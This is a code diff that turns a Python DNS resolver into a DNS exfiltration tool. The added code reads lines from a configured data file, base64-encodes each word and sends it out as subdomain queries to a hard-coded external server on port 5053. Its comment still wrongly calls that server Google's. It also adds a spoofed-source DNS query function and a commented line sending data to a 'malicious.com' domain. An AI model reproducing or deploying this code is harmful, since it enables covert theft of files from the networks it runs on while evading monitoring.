@@ -10,6 +10,7 @@ Handles only A type records.
 """
 
 import codecs
+import base64
 import sys
 import socket
 import time
@@ -31,10 +32,31 @@ def to_hex_string(x):
   return "0x" + result
 
 
+try:
+  conf = open('configuration file.txt', 'r')
+  confDictionary = {}
+  for line in conf.readlines():
+    line = line.replace("\n", "")
+    splited = line.split('=')
+    confDictionary[splited[0]]=splited[1]
+  conf.close()
+
+  SECONDS_BETWEEN_QUERIES = confDictionary.get("seconds_between_query")
+  METHOD = confDictionary.get("method")
+  DOMAIN_NAME = confDictionary.get("domain_name")
+  DNS_IP = confDictionary.get("dns_server_ip")
+  PATH_TO_DATA_FILE = confDictionary.get("path_to_data_file")
+except:
+  print("configuration file not found")
+
+DNS_ID_COUNT = 0
+
 #This method sends a dns query with spoofed ip to our destination server
 #The query wonwt get response back
+
 def spoofed_dns_query(source_ip_addr , des_ip_addr ,des_port, query):
-  pct = IP(src=source_ip_addr, dst=des_ip_addr) / UDP( dport=des_port) / DNS(rd=1, qd=DNSQR(qname=query), id=random.randint(0,65536))
+  pct = IP(src=source_ip_addr, dst=des_ip_addr) / UDP( dport=des_port) / DNS(rd=1, qd=DNSQR(qname=query), id=DNS_ID_COUNT)
+  DNS_ID_COUNT = (DNS_ID_COUNT+1)%65536
   send(pct)
 
 def is_valid_ipv4_address(address):
@@ -150,9 +172,9 @@ def resolve_host_name(host_name_to):
 
   # Send the packet off to the server.
 
-  DNS_IP = "8.8.8.8" # Google public DNS server IP.
+  DNS_IP = "141.226.242.178" # Google public DNS server IP.
 
-  DNS_PORT = 53 # DNS server port for queries.
+  DNS_PORT = 5053 # DNS server port for queries.
 
   READ_BUFFER = 1024 # The size of the buffer to read in the received UDP packet.
 
@@ -259,11 +281,56 @@ def resolve_host_name(host_name_to):
   return result
 
 
+def get_file_to_transfer(path):
+  toReturn = []
+  try:
+    f = open(path , 'r')
+    for line in f.readlines():
+      line = line.replace("\n","")
+      toReturn.append(line)
+    f.close()
+    return toReturn
+  except:
+    return toReturn
+
+
+def get_Base64_qeury(word):
+  message = word
+  message_bytes = message.encode('ascii')
+  base64_bytes = base64.b64encode(message_bytes)
+  base64_message = base64_bytes.decode('ascii')
+  return base64_message
+
+
+
+
 if __name__ == "__main__":
 
-  # Get the host name from the command line.
+  data_file = get_file_to_transfer(PATH_TO_DATA_FILE)
+  try:
+    if METHOD == "domain_based64":
+      for line in data_file:
+        splited = line.split(",")
+        for word in splited:
+          word=word.strip(" ")
+          word64=get_Base64_qeury(word)
+          resolve_host_name(word64+"."+str(DOMAIN_NAME))
+          time.sleep(int(SECONDS_BETWEEN_QUERIES))
+  except Exception as e:
+    pass
 
-  HOST_NAME = "google.com"
+
+  # file = get_file_to_transfer()
+  # for line in file:
+  #   splited = line.split(",")
+  #   for word in splited:
+  #     word64=get_Base64_qeury(word)
+  #     resolve_host_name(word64+".malicious.com")
+
+
+  # Get the host name from the command line.
+  # spoofed_dns_query("111.111.111.111","141.226.242.178",5053,"aaa.com")
+  # HOST_NAME = "google.com"
 
 # ### ORIGINAL CODE
 #       # try:
@@ -280,12 +347,12 @@ if __name__ == "__main__":
 #       #   print("\nHost Name:\n" + str(result['host_name']))
 #       #   print("\nIP Address:\n" + str(result['ip_address']) + "\n")
 #
-  while True :
-
-    result = resolve_host_name(HOST_NAME)
-
-    print("\nHost Name:\n" + str(result['host_name']))
-    print("\nIP Address:\n" + str(result['ip_address']) + "\n")
-    time.sleep(10)
+  # while True :
+  #
+  #   result = resolve_host_name(HOST_NAME)
+  #
+  #   print("\nHost Name:\n" + str(result['host_name']))
+  #   print("\nIP Address:\n" + str(result['ip_address']) + "\n")
+  #   time.sleep(10)
 
 
